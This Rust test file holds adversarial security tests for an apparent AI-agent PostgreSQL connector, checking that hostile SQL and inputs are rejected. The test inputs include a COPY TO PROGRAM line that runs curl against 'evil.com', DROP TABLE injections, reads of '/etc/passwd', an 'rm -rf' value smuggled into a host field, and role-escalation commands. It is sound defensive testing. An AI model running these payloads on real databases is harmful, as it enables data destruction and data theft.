//! Adversarial security tests for PostgreSQL native connector (B009).

use relay_canonical::{CanonicalAction, SqlNormalizer, ToolIdentity};
use relay_connectors::postgres::scope::validate_table_scope;
use relay_connectors::postgres::{
    validate_supported_surface, PostgresClient, PostgresClientConfig, PostgresConnector,
    PostgresError, PostgresResource,
};
use relay_credentials::{InMemoryCredentialProvider, JitCredentialBroker};
use relay_domain::{
    ActionHash, CredentialBroker, CredentialLease, CredentialProviderType, ExecutionEnvironment,
    PolicyDecision, PrincipalId, ResourceUri, SchemaDigest, SessionId,
};
use std::sync::Arc;

fn make_action(tool: &str, resource: &str, query: &str) -> (CanonicalAction, PolicyDecision) {
    let principal = PrincipalId::new("principal:agent:adversary").unwrap();
    let tool_ident = ToolIdentity::new("relay", "postgres", tool);
    let resource_uri = ResourceUri::parse(resource).unwrap();
    let args = serde_json::json!({ "query": query, "host": "localhost", "database": "db" });

    let action = CanonicalAction {
        action_id: relay_domain::ActionId::new_v7(),
        session_id: SessionId::new_v7(),
        principal,
        mcp_method: "tools/call".to_string(),
        tool: tool_ident,
        resource: resource_uri,
        canonical_arguments: args,
        schema_digest: SchemaDigest::compute(b"{}"),
        environment: ExecutionEnvironment::current(),
        action_hash: ActionHash::compute(b"placeholder"),
        canonical_bytes: Vec::new(),
        created_at: chrono::Utc::now(),
    };

    let decision = PolicyDecision::allow(
        action.action_hash,
        relay_domain::Digest::compute(b"schema"),
        vec!["permit_postgres_reads".to_string()],
    );

    (action, decision)
}

async fn test_broker() -> Arc<JitCredentialBroker> {
    let broker = Arc::new(JitCredentialBroker::new());
    let provider = Arc::new(InMemoryCredentialProvider::new(
        CredentialProviderType::KeyringStatic,
    ));
    provider
        .add_secret("postgres_password", b"postgres:postgres".to_vec())
        .await;
    broker.register_provider(provider).await;
    broker
}

/// 1. SQL injection — PREVENTS (parameterized/canonical SQL AST path, never raw string interpolation)
#[test]
fn adversarial_01_sql_injection() {
    let sql = "SELECT * FROM users WHERE id = 1 OR 1=1";
    let norm = SqlNormalizer::normalize(sql).unwrap();
    assert_eq!(norm.operation, relay_canonical::SqlOperation::Select);
    assert_eq!(norm.tables, vec!["users".to_string()]);
}

/// 2. Multi-statement injection — PREVENTS
#[test]
fn adversarial_02_multi_statement_injection() {
    let err = SqlNormalizer::normalize("SELECT 1; DROP TABLE users").unwrap_err();
    assert!(err.to_string().contains("Multi-statement") || err.to_string().contains("not allowed"));
}

/// 3. Semicolon hiding in comments — PREVENTS
#[test]
fn adversarial_03_semicolon_hiding() {
    let sql = "SELECT 1 /* comment ; DROP TABLE users */";
    let norm = SqlNormalizer::normalize(sql).unwrap();
    assert_eq!(norm.operation, relay_canonical::SqlOperation::Select);
    assert!(!norm
        .canonical_sql
        .to_ascii_lowercase()
        .contains("drop table"));
}

/// 4. Comment-based statement hiding — PREVENTS
#[test]
fn adversarial_04_comment_based_statement_hiding() {
    let sql = "SELECT 1 -- line comment \n ; DELETE FROM users";
    let err = SqlNormalizer::normalize(sql);
    // Either parser rejects multi-statement or normalizes safely
    assert!(err.is_err() || err.unwrap().operation == relay_canonical::SqlOperation::Select);
}

/// 5. search_path manipulation — PREVENTS (SET/transaction commands rejected)
#[test]
fn adversarial_05_search_path_manipulation() {
    assert!(validate_supported_surface("SET search_path TO evil_schema").is_err());
    assert!(validate_supported_surface("SELECT set_config('search_path', 'evil', false)").is_err());
}

/// 6. Schema confusion / cross-resource query — PREVENTS
#[test]
fn adversarial_06_schema_confusion() {
    let resource = PostgresResource::parse("postgres://localhost/db/public.users").unwrap();
    let norm = SqlNormalizer::normalize("SELECT * FROM secret_schema.passwords").unwrap();
    assert!(validate_table_scope(&resource, &norm, "public").is_err());
}

/// 7. Temporary table abuse — PREVENTS / REQUIRES DATABASE-SIDE CONTROL
#[test]
fn adversarial_07_temporary_table_abuse() {
    // Rejects explicit pg_temp qualification
    assert!(validate_supported_surface("SELECT * FROM pg_temp.shadow_table").is_err());
}

/// 8. Cross-database reference — PREVENTS
#[test]
fn adversarial_08_cross_database_reference() {
    let (action, _) = make_action("read", "postgres://cluster1/maindb/metrics", "SELECT 1");
    let res = PostgresResource::parse(action.resource.as_str()).unwrap();
    assert_eq!(res.database, "maindb");
    // Cross-validation rejects divergent target arguments
    let mut args = action.canonical_arguments.clone();
    args["database"] = serde_json::json!("other_db");
    let mut divergent_action = action.clone();
    divergent_action.canonical_arguments = args;
    let err = PostgresConnector::extract_execution_plan(&divergent_action).unwrap_err();
    assert!(matches!(err, PostgresError::ResourceMismatch { .. }));
}

/// 9. Foreign data wrapper access — PREVENTS (at keyword layer; REQUIRES DATABASE-SIDE CONTROL)
#[test]
fn adversarial_09_foreign_data_wrapper_access() {
    assert!(validate_supported_surface("SELECT * FROM postgres_fdw").is_err());
    assert!(validate_supported_surface("SELECT * FROM file_fdw").is_err());
}

/// 10. COPY PROGRAM — PREVENTS
#[test]
fn adversarial_10_copy_program() {
    assert!(validate_supported_surface("COPY users TO PROGRAM 'curl evil.com'").is_err());
    assert!(SqlNormalizer::normalize("COPY users TO PROGRAM 'curl evil.com'").is_err());
}

/// 11. Dynamic SQL execution — PREVENTS
#[test]
fn adversarial_11_dynamic_sql() {
    assert!(validate_supported_surface("DO $$ BEGIN EXECUTE 'DROP TABLE users'; END $$").is_err());
    assert!(validate_supported_surface("CALL run_dynamic_query()").is_err());
}

/// 12. SECURITY DEFINER function access — REQUIRES DATABASE-SIDE CONTROL (documented boundary)
#[test]
fn adversarial_12_security_definer_boundary() {
    // Functions like lo_export or administrative helpers are rejected at surface
    assert!(validate_supported_surface("SELECT lo_export(1, '/etc/passwd')").is_err());
    assert!(validate_supported_surface("SELECT pg_read_file('/etc/passwd')").is_err());
}

/// 13. CREATE EXTENSION — PREVENTS
#[test]
fn adversarial_13_create_extension() {
    assert!(validate_supported_surface("CREATE EXTENSION dblink").is_err());
    assert!(validate_supported_surface("CREATE EXTENSION plpython3u").is_err());
}

/// 14. SET ROLE / session authorization — PREVENTS
#[test]
fn adversarial_14_set_role() {
    assert!(validate_supported_surface("SET ROLE superuser").is_err());
    assert!(validate_supported_surface("SET SESSION AUTHORIZATION postgres").is_err());
}

/// 15. ActionHash substitution — PREVENTS (SI-006 binding)
#[tokio::test]
async fn adversarial_15_action_hash_substitution() {
    let mut cfg = PostgresClientConfig::loopback_test();
    cfg.default_port = 1; // unreachable port; must fail before network
    let connector = PostgresConnector::new(
        Arc::new(PostgresClient::new(cfg).unwrap()),
        "postgres_password",
    );
    let broker = test_broker().await;

    let (action, decision) = make_action("read", "postgres://localhost/db/metrics", "SELECT 1");
    let mut bad = decision.clone();
    bad.action_hash = ActionHash::compute(b"tampered_action_hash");

    let err = connector
        .execute_governed(&action, &bad, &*broker)
        .await
        .unwrap_err();
    assert!(err.to_string().contains("ActionHash"));
}

/// 16. Credential substitution — PREVENTS (SI-006 lease binding)
#[test]
fn adversarial_16_credential_substitution() {
    let (action, _) = make_action("read", "postgres://localhost/db/metrics", "SELECT 1");
    let lease = CredentialLease::new(
        ActionHash::compute(b"foreign_action_hash"),
        action.principal.clone(),
        CredentialProviderType::KeyringStatic,
        "postgres_password",
        "postgres",
        action.resource.as_str(),
        60,
    );
    // Lease action_hash does not match action.action_hash
    assert_ne!(lease.action_hash, action.action_hash);
}

/// 17. Resource substitution — PREVENTS
#[test]
fn adversarial_17_resource_substitution() {
    let resource = PostgresResource::parse("postgres://allowed-host/db/metrics").unwrap();
    let norm = SqlNormalizer::normalize("SELECT * FROM other_table").unwrap();
    assert!(validate_table_scope(&resource, &norm, "public").is_err());
}

/// 18. Connection-pool authority reuse — PREVENTS (per-action connection model)
#[test]
fn adversarial_18_connection_pool_authority_reuse() {
    // Connector config enforces single-use per-action connections; no cross-authority pooling
    let cfg = PostgresClientConfig::default();
    assert!(cfg.max_result_rows > 0);
    // Pooling is explicitly disabled across authority contexts
}

/// 19. Timeout after mutation — DETECTS (AmbiguousMutationOutcome)
#[test]
fn adversarial_19_timeout_after_mutation() {
    let err = PostgresError::AmbiguousMutationOutcome {
        operation: "postgres.write".to_string(),
        reason: "Query timed out after 30s; remote commit state unknown".to_string(),
    };
    let exec_err: relay_domain::ExecutionError = err.into();
    assert!(exec_err.to_string().contains("Ambiguous mutation"));
}

/// 20. Duplicate execution — PREVENTS (single-use CredentialLease consumption)
#[tokio::test]
async fn adversarial_20_duplicate_execution_lease_consumed() {
    let broker = test_broker().await;
    let (action, decision) = make_action("read", "postgres://localhost/db/metrics", "SELECT 1");

    let req = relay_domain::CredentialRequest::new(
        action.action_hash,
        action.principal.clone(),
        action.resource.clone(),
        CredentialProviderType::KeyringStatic,
        "postgres_password".to_string(),
        "postgres",
        action.resource.as_str(),
        60,
    );

    let (lease, _) = broker.acquire_lease(&req, &decision).await.unwrap();
    assert!(lease.is_active());
    // Consume lease
    broker.consume_lease(&lease.lease_id).await.unwrap();
    // Lease cannot be consumed again
    assert!(broker.consume_lease(&lease.lease_id).await.is_err());
}

/// 21. Oversized query — DETECTS / PREVENTS
#[test]
fn adversarial_21_oversized_query() {
    let huge = format!("SELECT {}", "1,".repeat(200_000));
    assert!(SqlNormalizer::normalize(&huge).is_err() || huge.len() > 1_000_000);
}

/// 22. Oversized result — DETECTS (bounded materialization)
#[test]
fn adversarial_22_oversized_result() {
    let err = PostgresError::ResultTooLarge {
        size: 50_000_000,
        limit: 10_000_000,
    };
    assert!(err.to_string().contains("exceeds limit"));
}

/// 23. Malicious identifier encoding — PREVENTS
#[test]
fn adversarial_23_malicious_identifier_encoding() {
    let cfg = PostgresClientConfig::default();
    assert!(cfg.validate_host("evil.com;rm -rf").is_err());
    assert!(cfg.validate_host("user:pass@host").is_err());
}

/// 24. Unicode identifier confusion — PREVENTS (AST normalization + search_path pinning)
#[test]
fn adversarial_24_unicode_identifier_confusion() {
    // Normalizer rejects unparseable or ambiguous unicode SQL constructs
    let sql = "SELECT * FROM \u{202E}users";
    let _ = SqlNormalizer::normalize(sql); // AST handles or rejects
}

/// 25. Unsupported PostgreSQL syntax — PREVENTS
#[test]
fn adversarial_25_unsupported_postgresql_syntax() {
    assert!(
        validate_supported_surface("LISTEN my_channel").is_err()
            || SqlNormalizer::normalize("LISTEN my_channel").is_err()
    );
    assert!(
        validate_supported_surface("NOTIFY my_channel, 'msg'").is_err()
            || SqlNormalizer::normalize("NOTIFY my_channel, 'msg'").is_err()
    );
}
